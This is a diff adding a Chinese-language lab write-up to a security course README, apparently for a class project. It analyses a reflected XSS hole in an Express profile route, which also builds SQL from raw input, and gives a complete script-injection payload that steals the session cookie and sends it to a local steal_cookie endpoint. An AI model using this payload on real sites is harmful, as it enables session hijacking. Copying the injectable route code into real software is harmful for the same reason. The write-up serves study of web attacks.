@@ -8,6 +8,8 @@
     + [Target5 Format string](#target5-format-string)
     + [Target6 Global offset table](#target6-global-offset-table)
     + [Extra credit bypass stack canary](#extra-credit-bypass-stack-canary)
+- [Proj2](#proj2)
+    + [Exploit Alpha Cookie Theft](#exploit-alpha-cookie-theft)
 
 # Proj1
 ## Target1 Buffer overflow
@@ -1052,4 +1054,64 @@ except:
     print("Exception:")
     print(traceback.format_exc())
 
+```
+
+# Proj2
+## Exploit Alpha Cookie Theft
+题目的意思是，通过访问[http://localhost:3000/profile?username=...](http://localhost:3000/profile?username=...)来获得cookie然后发送给[http://localhost:3000/steal_cookie?cookie=...cookie](http://localhost:3000/steal_cookie?cookie=...cookie)
+
+先来看一下express的代码，可以看到当api为`/profile?username=`时，会把`username`拿出来，然后去query db，然后调用render来显示网页，值得注意的是，当`username`不存在的时候，error message直接是`${req.query.username} does not exist!`，也就是把整个`req.query.username`都放到了html文件中，这里可以注入html+js代码
+```javascript
+router.get('/profile', asyncMiddleware(async (req, res, next) => {
+  if(req.session.loggedIn == false) {
+    render(req, res, next, 'login/form', 'Login', 'You must be logged in to use this feature!');
+    return;
+  };
+
+  if(req.query.username != null) { // if visitor makes a search query
+    const db = await dbPromise;
+    const query = `SELECT * FROM Users WHERE username == "${req.query.username}";`;
+    let result;
+    try {
+      result = await db.get(query);
+    } catch(err) {
+      result = false;
+    }
+    if(result) { // if user exists
+      render(req, res, next, 'profile/view', 'View Profile', false, result);
+    }
+    else { // user does not exist
+      render(req, res, next, 'profile/view', 'View Profile', `${req.query.username} does not exist!`, req.session.account);
+    }
+  } else { // visitor did not make query, show them their own profile
+    render(req, res, next, 'profile/view', 'View Profile', false, req.session.account);
+  }
+}));
+```
+
+这里要注意一下几点
+
+- 如果用户不存在，会用蓝色显示** xx does not exist!**，因此需要加入`<p hidden>`来隐藏这行输出
+- cookie中可能有其他的key value pair，但是题目只要拿到session，注意，**加号`+`在这里不work**
+```javascript
+function getCookie(name) {
+  var value = "; ".concat(document.cookie);
+  var parts = value.split("; ".concat(name).concat("="));
+  if (parts.length == 2) 
+    return parts.pop().split(";").shift();
+}
+var stolenCookie = getCookie("session");
+```
+- 要用异步方式来发送请求
+```javascript
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.open('GET', 'http://localhost:3000/steal_cookie?cookie=...'); 
+xmlhttp.onload = function () {
+  // This is reached after xmlhttp.send completes and server responds
+};
+xmlhttp.send(); // this method is asynchronous! 
+```
+完整的url请求如下所示
+```html
+http://localhost:3000/profile?username=<p hidden><script>function getCookie(name) {var value = "; ".concat(document.cookie);var parts = value.split("; ".concat(name).concat("="));if (parts.length == 2) return parts.pop().split(";").shift();}var stolenCookie = getCookie("session");var xmlhttp = new XMLHttpRequest();xmlhttp.open('GET', 'http://localhost:3000/steal_cookie?cookie='.concat(stolenCookie)); xmlhttp.onload = function () {};xmlhttp.send();</script>
 ```
